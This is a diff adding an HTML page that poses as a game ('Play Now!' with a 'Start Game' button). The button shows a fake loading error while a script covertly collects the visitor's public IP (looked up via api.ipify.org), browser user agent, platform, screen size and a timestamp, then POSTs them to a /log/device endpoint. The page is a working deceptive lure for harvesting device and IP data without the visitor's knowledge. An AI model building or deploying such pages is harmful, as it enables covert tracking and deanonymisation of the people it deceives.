@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>THUNDRX - Device Info</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #181c20; color: #fff; text-align: center; }
+        .container { margin-top: 10vh; }
+        .box { background: #23272b; padding: 2em; border-radius: 8px; display: inline-block; }
+        button { background: #00bfff; color: #fff; padding: 0.5em 1em; border: none; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="box">
+        <h2>Play Now!</h2>
+        <button onclick="errorPopup()">Start Game</button>
+    </div>
+</div>
+<script>
+function errorPopup() {
+    alert('Error loading game');
+    let info = {
+        ip: '',
+        browser: navigator.userAgent,
+        os: navigator.platform,
+        screen: window.screen.width + 'x' + window.screen.height,
+        ts: Date.now()
+    };
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
+        info.ip = d.ip;
+        fetch('/log/device', { method: 'POST', body: JSON.stringify(info) });
+    });
+}
+</script>
+</body>
+</html>
